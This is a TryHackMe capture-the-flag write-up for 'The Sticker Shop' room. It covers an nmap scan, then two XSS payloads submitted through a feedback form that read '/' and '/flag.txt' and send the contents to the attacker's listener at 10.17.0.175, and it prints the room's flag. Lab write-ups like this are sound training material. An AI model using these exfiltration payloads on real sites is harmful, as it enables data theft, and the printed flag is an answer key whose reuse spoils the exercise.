---
title: The Sticker Shop
categories: [TryHackMe]
tags: [XSS,THM]
image: /assets/thumbnails/thestickershop.jpg
---

Easy room created by [toxicat0r](https://tryhackme.com/r/p/toxicat0r). This rooms focus on the XSS vulnerabilitty. So if you guys want to try it, you can access the room [here](https://tryhackme.com/r/room/thestickershop).

## Scanning

> Start your machine to obtain the `Machine IP address` and Fire up your Nmap tools like always. To scan for the open port and services of the `IP Address`. Using the command `nmap -sC -sV [IP Address]`, and wait for a couple of minute until the scanning finish.

![image](https://github.com/user-attachments/assets/e6ed8ccb-0fdc-4ac6-83b9-86fe36e52c18)

> From our scanning result, Here we got 2 open port which is `22` for `SSH` services and `8080` for `HTTP`. So there is a website serives assigned to the `IP Address`. Let visit the site by using this url `http://IP MACHINE:8080`.

![image](https://github.com/user-attachments/assets/440aea69-215d-4a39-937f-406c8fede2b5)

## Attack & Get The Flag

> There 2 pages in the website which is `Home` and `Feeback`. Nothing was intresting in the `Home` page. Let see the `Feebackk` page.

![image](https://github.com/user-attachments/assets/4c872f7a-3b13-40fc-bad0-baa4fa735ff7)

> This is the juicy part. As we all know the `Feedback` and `Comment` pages are quite famous with `XSS` Vulnerability. So here let test if the `XSS` is reflected by the machine or not.

### Setup And Payload. 

> To test if the machine reflected to our `XSS` or not. First, i setup local server using command `Python -m http.server 80`. So that when using the `XSS`, i will be able to see the response on our local server. 

![image](https://github.com/user-attachments/assets/f51a28b1-ef2c-4fff-9635-6fcde95a825b)

> For the test payload (Shout out to CHATGPT for the assist). For test payload, i use `GET` method to fetch the source code for the `Home` page. Here is the payload :

```
<script>
  fetch('/')
    .then(response => response.text())
    .then(data => {
      const encoded = btoa(data); // Base64 encode the response text
      new Image().src = 'http://10.17.0.175/' + encoded;
    })
    .catch(err => console.error(err));
</script>
```

> Basically the payload do is `fetch('/'): Requests the source code of the current page (index page)`, `btoa(data): Converts the page source to a Base64-encoded string` .
`new Image().src: Sends the encoded source as a GET parameter (source) to your server`  

![image](https://github.com/user-attachments/assets/da47666c-25ad-4652-bedb-7b2a29e16cb1)

> The machine respone was send to our local python server and we got endoded `Base64` strings from the response which if we decode it, we obtained the source code of the index page, just like our payload should do. This remark that our payload is working and the machine is facing `XSS` vulnerability. 

### Get The Flag. 

> In the rooms description, author mentioned that the flag was located at `/flag.txt`. So using same method as our test payload, to reflect the responses from the machine to our local python server. but Since we know the location of the flag. We just need to do a little bit changes from our test payload and our new payload is ready to go. Here is the new payload :

```
<script>
  fetch('/flag.txt')
    .then(response => response.text())
    .then(data => {
      new Image().src = 'http://10.17.0.175/?flag=' + encodeURIComponent(data);
    });
</script>
```
> Retrun back to our local python server, and as you can see. The machine reflected the text in the `\flag.txt` to our local server and we managed to get the flag.

![image](https://github.com/user-attachments/assets/52624075-942a-44dc-a7b3-5cc70b3e4cda)


## Flag 

> THM{B83789a69074f636f64a38879cfcabe8b62305ee6}



